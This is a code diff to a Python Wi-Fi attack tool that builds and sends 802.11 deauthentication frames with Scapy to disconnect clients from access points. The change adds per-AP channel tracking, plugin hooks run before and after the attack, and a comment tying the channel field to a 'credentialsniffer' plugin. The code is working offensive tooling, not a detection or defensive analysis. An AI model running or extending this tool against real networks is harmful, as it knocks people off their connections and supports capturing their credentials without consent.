@@ -15,10 +15,11 @@ from socket import error as socket_error
 from textwrap import dedent
 
 class DeauthAP(object):
-    def __init__(self, id = 0, bssid = None, ssid = None):
+    def __init__(self, id = 0, bssid = None, ssid = None, channel = 7):
         self.id = id
         self.bssid = bssid
         self.ssid = ssid
+        self.channel = channel # Useful when using the credentialsniffer plugin
 
     def __eq__(self, other):
         return self.bssid == other.bssid
@@ -56,9 +57,10 @@ class AirDeauthenticator(object):
         self._burst_count = burst_count         # Number of sequential deuathentication packet bursts to send
         self.aps_to_deauth = set()              # MAC addresses of APs, used to send deauthentication packets to broadcast
         self.clients_to_deauth = set()          # Pairs clients to their connected AP to send targeted deauthentication attacks
+        self.plugins = []
 
-    def add_ap(self, ap, ssid):
-        deauth_ap = DeauthAP(len(self.aps_to_deauth), ap, ssid)
+    def add_ap(self, ap, ssid, channel):
+        deauth_ap = DeauthAP(len(self.aps_to_deauth), ap, ssid, channel)
         if deauth_ap not in self.aps_to_deauth:
             self.aps_to_deauth.add(deauth_ap)
 
@@ -88,6 +90,9 @@ class AirDeauthenticator(object):
         # Based on:
         # https://raidersec.blogspot.pt/2013/01/wireless-deauth-attack-using-aireplay.html
 
+        for plugin in self.plugins:
+            plugin.pre_deauth()
+
         packets = []
 
         if not self._targeted_only:
@@ -100,7 +105,7 @@ class AirDeauthenticator(object):
 
         for client in self.clients_to_deauth:
             mac = client.client_mac
-            bssid = client.bssid
+            bssid = client.ap_bssid
             deauth_packet1 =    RadioTap() / \
                                 Dot11(type=0,subtype=12, addr1=bssid, addr2=mac, addr3=mac) / \
                                 Dot11Deauth(reason=7)
@@ -134,6 +139,10 @@ class AirDeauthenticator(object):
         self.deauth_running = False
         self._restore_deauthor_state()
         print "[+] Deauthentication attack finished executing."
+
+        for plugin in self.plugins:
+            plugin.post_deauth()
+        del self.plugins[:]
 
     def _restore_deauthor_state(self):
         card = NetworkCard(self.running_interface)
